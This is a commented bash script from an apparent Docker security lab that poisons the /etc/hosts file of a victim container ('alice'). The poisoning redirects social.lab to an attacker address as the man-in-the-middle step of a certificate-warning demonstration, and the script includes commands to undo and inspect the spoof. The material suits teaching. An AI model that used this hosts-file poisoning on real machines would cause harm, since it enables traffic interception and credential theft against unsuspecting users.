#!/bin/bash
# Local DNS spoof - run from the project root ON THE HOST (not inside a
# container). It poisons ALICE'S /etc/hosts so that, on her machine only,
# social.lab resolves to the attacker instead of the real server.
#
#   ./attacker/spoof.sh on     add    "172.28.0.66 social.lab" to alice's hosts
#   ./attacker/spoof.sh off    remove that line again
#   ./attacker/spoof.sh show   print the spoof line and what alice resolves
#
# This is the MITM step, done the way a local attacker would: Alice's resolver
# checks /etc/hosts before DNS (nsswitch "hosts: files dns"), so the planted
# line overrides whatever the lab DNS says. After "on", her Firefox looks up
# social.lab, is sent to the attacker, and its self-signed certificate triggers
# the browser's warning.
#
# (It edits alice's /etc/hosts, not the DNS server, so only Alice is affected
#  and the lab DNS is left untouched. Docker rebuilds /etc/hosts when the alice
#  container restarts, which also clears the spoof.)
#
# Docker bind-mounts /etc/hosts, so it can't be renamed over (no "sed -i"): we
# rewrite it in place with a temp file and "cat > /etc/hosts" instead.
# Stop on the first error; run from the project root (this script lives in
# attacker/, so "cd .." puts us where "docker compose" finds the lab).
set -e
cd "$(dirname "$0")/.."

# Settings in one place, so the commands below read clearly.
VICTIM="alice"                 # the container whose /etc/hosts we edit
ATTACKER_IP="172.28.0.66"      # where we want social.lab to point (the attacker)
DOMAIN="social.lab"            # the name we are hijacking
MARK="# ATTACKER-SPOOF"        # a tag on our line, so we can find/remove just it
TMP="/tmp/hosts.spoof"         # scratch file used to rewrite /etc/hosts safely

# "$1" is the first word you typed after the script name (on / off / show).
case "$1" in
  on)
    # Run a little script INSIDE Alice's container (docker compose exec). It:
    #   1. copies every line of /etc/hosts EXCEPT any old spoof line of ours
    #      (grep -v = "lines not matching"; "|| true" keeps going if grep finds
    #      nothing to keep) into the temp file - this de-duplicates,
    #   2. appends our poisoned mapping "<attacker ip>\t<domain>\t# tag",
    #   3. copies the temp file back OVER /etc/hosts with "cat > " (we can't use
    #      "sed -i" because Docker bind-mounts /etc/hosts and it can't be
    #      renamed over), then deletes the temp file.
    docker compose exec "$VICTIM" sh -c \
      "grep -v '${MARK}' /etc/hosts > ${TMP} || true; \
       printf '%s\t%s\t%s\n' '${ATTACKER_IP}' '${DOMAIN}' '${MARK}' >> ${TMP}; \
       cat ${TMP} > /etc/hosts; rm -f ${TMP}"
    # Because /etc/hosts is consulted before DNS (nsswitch "hosts: files dns"),
    # Alice now resolves social.lab to us no matter what the lab DNS says.
    echo "SPOOFED: on alice, ${DOMAIN} now points at the attacker (${ATTACKER_IP})."
    echo "In Alice's Firefox, open https://${DOMAIN} - expect a certificate warning."
    echo "(Firefox caches DNS ~1 min; restart it or wait if the old site sticks.)"
    ;;
  off)
    # Same rewrite, but WITHOUT appending our line - so the spoof entry is
    # simply dropped and /etc/hosts goes back to normal.
    docker compose exec "$VICTIM" sh -c \
      "grep -v '${MARK}' /etc/hosts > ${TMP} || true; \
       cat ${TMP} > /etc/hosts; rm -f ${TMP}"
    echo "RESTORED: removed the spoof line - ${DOMAIN} resolves via the lab DNS again."
    ;;
  show)
    # Read-only status. First: is our tagged line present in Alice's hosts file?
    echo "-- alice's /etc/hosts spoof line --"
    docker compose exec "$VICTIM" sh -c "grep '${MARK}' /etc/hosts || echo '(none)'"
    # Second: what does Alice actually resolve the name to right now? "getent
    # hosts" runs the real resolver (files + DNS), so this is the ground truth.
    echo "-- what alice resolves ${DOMAIN} to now --"
    docker compose exec "$VICTIM" getent hosts "${DOMAIN}" || echo "(does not resolve)"
    ;;
  *)
    # Anything else (or nothing): print usage and exit with an error code.
    echo "usage: $0 {on|off|show}"
    exit 1
    ;;
esac
